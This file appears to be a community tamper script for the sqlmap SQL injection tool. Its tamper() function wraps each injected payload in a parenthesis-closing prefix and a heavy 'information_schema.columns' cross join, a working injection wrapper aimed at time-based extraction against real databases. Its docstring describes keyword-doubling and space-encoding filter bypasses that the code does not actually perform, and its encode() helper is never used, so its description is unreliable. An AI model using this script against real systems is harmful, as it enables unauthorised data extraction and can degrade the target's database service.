#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
'''
Author    :   R4gd0ll
'''

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def encode(string):
    encode_string = ""
    for char in string:
        encode_char = hex(ord(char)).replace("0x","%")
        encode_string += encode_char
    return encode_string

def tamper(payload, **kwargs):
    """
    #           and '1
    -- 
    and         anANDd
    or          oORr
    <space>     %a0
    """

    payload0 = "1)%20and%20"
    payload1 = "%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"

    payload =payload0 +  payload + payload1
    return payload